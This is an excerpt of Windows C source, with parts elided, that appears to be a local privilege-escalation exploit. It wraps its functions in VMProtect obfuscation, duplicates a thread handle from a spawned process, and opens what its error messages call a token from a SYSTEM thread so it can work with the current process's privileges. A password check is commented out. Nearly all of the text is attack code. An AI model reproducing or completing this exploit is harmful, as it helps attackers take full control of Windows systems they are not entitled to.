...
DWORD WINAPI ThreadProc(LPVOID lpParam){
	VMProtectBeginVirtualization("ThreadProc");
	BYTE b[1030];
	DWORD d = 0;
...
int wmain(int argc, WCHAR* argv[])
{
	...
	VMProtectBeginVirtualization("mainPcs");
	printf("ms32Ba\n");
	/*
	if (wcscmp(argv[2], L"password"))
	{
		wprintf(L"%s", argv[2]);
		return -1;
	}
	*/
	...
	if (!DuplicateHandle(pi.hProcess, (HANDLE)4, GetCurrentProcess(), &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS))
	{
		...
		CALL die("[x] can not duplicate thread handle");
	}
	TerminateProcess(pi.hProcess, 1);
	...
	{
		CALL die("[x] can not open token from SYSTEM thread");
	}
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hCurrentToken))
	{
		CALL die("[x] can not open current process token");
	}
	if(!GetTokenInformation(hCurrentToken, TokenPrivileges, tp, 2048, &d))
	{
		CALL die("[x] can not get current privileges");
	}
